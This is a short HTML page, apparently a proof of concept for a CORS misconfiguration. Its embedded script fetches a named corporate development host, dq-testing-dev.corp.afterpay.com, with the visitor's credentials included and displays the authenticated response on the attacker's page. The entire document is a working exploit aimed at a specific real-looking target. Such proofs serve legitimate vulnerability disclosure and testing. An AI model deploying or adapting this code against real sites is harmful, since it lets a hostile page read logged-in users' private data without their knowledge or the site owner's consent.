<!DOCTYPE html>
<html>
  <head>
    <title>🔥 CORS Exploit PoC</title>
    <style>
      body { font-family: monospace; padding: 2rem; background: #111; color: #0f0; }
      pre { white-space: pre-wrap; word-break: break-all; }
    </style>
  </head>
  <body>
    <h1>🔥 CORS Exploit PoC</h1>
    <p>Trying to fetch authenticated content from: <code>https://dq-testing-dev.corp.afterpay.com</code></p>
    <pre id="output">Loading...</pre>

    <script>
      fetch("https://dq-testing-dev.corp.afterpay.com", {
        method: "GET",
        credentials: "include"
      })
      .then(response => response.text())
      .then(data => {
        document.getElementById("output").textContent = data;
      })
      .catch(error => {
        document.getElementById("output").textContent = "❌ Error:\n" + error;
      });
    </script>
  </body>
</html>
